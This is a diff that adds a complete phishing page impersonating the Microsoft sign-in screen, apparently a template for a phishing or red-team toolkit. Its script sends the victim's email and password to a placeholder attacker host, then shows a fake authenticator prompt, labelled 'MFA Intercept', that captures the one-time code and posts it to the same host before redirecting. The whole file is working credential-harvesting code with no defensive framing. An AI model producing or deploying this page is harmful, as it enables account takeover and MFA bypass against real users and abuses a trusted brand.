@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sign in to your account</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background-color: #f2f2f2; font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-image: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg'); background-size: cover; }
+        .container { background: white; padding: 44px; width: 350px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
+        h2 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-top: 16px; margin-bottom: 20px; }
+        input { width: 100%; padding: 8px 0; margin-bottom: 20px; border: none; border-bottom: 1px solid #000; box-sizing: border-box; font-size: 15px; outline: none; }
+        input:focus { border-bottom: 1px solid #0067b8; }
+        button { padding: 10px 30px; background-color: #0067b8; color: white; border: none; font-size: 15px; cursor: pointer; float: right; transition: 0.2s; }
+        button:hover { background-color: #005da6; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
+        .spinner { display: none; margin-top: 20px; text-align: center; color: #0067b8; font-weight: 600;}
+    </style>
+</head>
+<body>
+    <div class="container" id="login-box">
+        <div style="font-weight: bold; font-size: 20px; color: #737373;">Microsoft</div>
+        <h2 id="title-text">Sign in</h2>
+        
+        <form id="authForm">
+            <!-- Stage 1: Credentials -->
+            <div id="step1">
+                <input type="text" id="email" name="email" placeholder="Email, phone, or Skype" required>
+                <input type="password" id="pass" name="pass" placeholder="Password" required>
+                <div style="overflow: hidden; margin-top: 15px;">
+                    <button type="button" onclick="submitStep1()">Sign in</button>
+                </div>
+            </div>
+            
+            <!-- Stage 2: MFA Intercept -->
+            <div id="step2" style="display: none;">
+                <p style="font-size: 14px; color: #1b1b1b;">Please type in the code displayed on your authenticator app from your device.</p>
+                <input type="text" id="mfa" name="mfa_token" placeholder="6-digit code" autocomplete="off" required>
+                <div style="overflow: hidden; margin-top: 15px;">
+                    <button type="button" onclick="submitStep2()">Verify</button>
+                </div>
+            </div>
+            
+            <!-- Processing Spinner -->
+            <div id="loading" class="spinner">
+                <p>Verifying identity...</p>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        function submitStep1() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            if(!email || !pass) return;
+
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+
+            fetch("http://{{LHOST}}:{{LPORT}}/auth", { method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, body: `email=${encodeURIComponent(email)}&pass=${encodeURIComponent(pass)}`
+            }).then(() => { setTimeout(() => {
+                    document.getElementById('loading').style.display = 'none'; document.getElementById('title-text').innerText = "Enter code"; document.getElementById('step2').style.display = 'block';
+            }, 1500); });
+        }
+
+        function submitStep2() {
+            const email = document.getElementById('email').value;
+            const mfa = document.getElementById('mfa').value;
+            if(!mfa) return;
+            document.getElementById('step2').style.display = 'none'; document.getElementById('loading').style.display = 'block';
+            fetch("http://{{LHOST}}:{{LPORT}}/mfa", { method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, body: `email=${encodeURIComponent(email)}&mfa_token=${encodeURIComponent(mfa)}`
+            }).then(() => { setTimeout(() => { window.location.href = "{{REDIRECT_URL}}"; }, 1000); });
+        }
+    </script>
+</body>
+</html>
